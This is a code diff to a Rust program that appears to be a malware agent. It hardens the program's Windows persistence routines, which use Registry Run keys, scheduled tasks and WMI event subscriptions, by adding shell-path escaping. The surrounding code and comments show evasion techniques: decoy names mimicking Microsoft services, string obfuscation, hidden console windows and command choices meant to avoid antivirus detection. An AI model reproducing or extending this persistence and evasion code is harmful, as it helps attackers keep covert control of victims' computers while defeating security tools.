@@ -197,6 +197,21 @@ fn get_machine_index() -> usize {
     hash.wrapping_add(pid as usize)
 }
 
+/// Escape special characters in path for safe shell execution
+/// Replaces problematic characters that could be used for command injection
+#[cfg(target_os = "windows")]
+fn escape_shell_path(path: &str) -> String {
+    // In Windows cmd.exe, the main concerns are:
+    // - & (command separator)
+    // - | (pipe)
+    // - ^ (escape character)
+    // - < > (redirection)
+    // - " (quote - handled by our quoting)
+    // Since we wrap paths in double quotes, most special chars are safe
+    // We escape ^ and % which have special meaning even inside quotes
+    path.replace("^", "^^").replace("%", "%%")
+}
+
 /// Registry Run persistence - método más simple y efectivo
 /// Uses cmd /c start /min wrapper to hide execution window
 /// Note: The agent must be compiled with --features production for windowless operation
@@ -204,6 +219,9 @@ fn get_machine_index() -> usize {
 fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
         .ok_or_else(|| "Invalid path".to_string())?;
+    
+    // Escape special shell characters to prevent command injection
+    let exe_escaped = escape_shell_path(exe_str);
     
     // Polymorphic registry value names that look legitimate
     let reg_names = [
@@ -221,7 +239,7 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     
     // Use cmd /c start /min to hide console window on startup
     // This is less suspicious than PowerShell to AV systems
-    let exe_cmd = format!(r#"cmd.exe /c start /min "" "{}""#, exe_str);
+    let exe_cmd = format!(r#"cmd.exe /c start /min "" "{}""#, exe_escaped);
     
     // Registry key path
     let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
@@ -254,6 +272,9 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
         .ok_or_else(|| "Invalid path".to_string())?;
     
+    // Escape special shell characters to prevent command injection
+    let exe_escaped = escape_shell_path(exe_str);
+    
     // Polymorphic task names
     let task_names = [
         "MicrosoftEdgeUpdateTaskUser",
@@ -283,7 +304,7 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     // cmd /c timeout + start /min is less monitored than PowerShell
     let task_cmd = format!(
         r#"cmd.exe /c timeout /t {} /nobreak >nul && start /min "" "{}""#,
-        delay_secs, exe_str
+        delay_secs, exe_escaped
     );
     
     // Create scheduled task on logon with additional delay
@@ -317,6 +338,10 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
         .ok_or_else(|| "Invalid path".to_string())?;
     
+    // Escape special shell characters first, then escape backslashes for WMI
+    let exe_shell_escaped = escape_shell_path(exe_str);
+    let exe_wmi_escaped = exe_shell_escaped.replace("\\", "\\\\");
+    
     // Polymorphic WMI event names
     let wmi_names = [
         "BfeOnServiceStateChange",
@@ -326,9 +351,6 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     ];
     let idx = get_machine_index() % wmi_names.len();
     let event_name = wmi_names[idx];
-    
-    // Escape backslashes for WMI command line template
-    let exe_escaped = exe_str.replace("\\", "\\\\");
     
     // Random hour for trigger (less predictable)
     let trigger_hour = 8 + (get_machine_index() % 8); // 8am-4pm range
@@ -358,7 +380,7 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
             "$B.Put()|Out-Null"
         ),
         wmi_root, event_name, cimv2_ns, trigger_hour,
-        wmi_root, event_name, exe_escaped,
+        wmi_root, event_name, exe_wmi_escaped,
         wmi_root
     );
     
